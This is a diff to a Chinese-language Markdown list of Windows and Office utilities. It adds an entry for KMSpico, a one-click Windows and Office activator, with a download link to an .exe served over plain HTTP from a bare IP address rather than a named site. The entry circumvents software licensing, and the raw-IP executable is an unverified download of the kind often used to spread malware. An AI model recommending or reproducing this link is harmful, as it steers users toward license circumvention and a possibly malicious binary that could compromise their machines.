@@ -107,6 +107,12 @@ Office套件管理
 - 通过安装证书激活office  
 - 下载、在线安装各个版本office中的各个组件
 
+### [KMSpico](https://www.officialkmspico.com/)
+
+Windows系统、Office组件一键激活
+
+[下载](http://185.125.230.210/KMSpico-setup.exe)
+
 ## 应用商店
 
 ### [OneQuick](https://onequick.org)
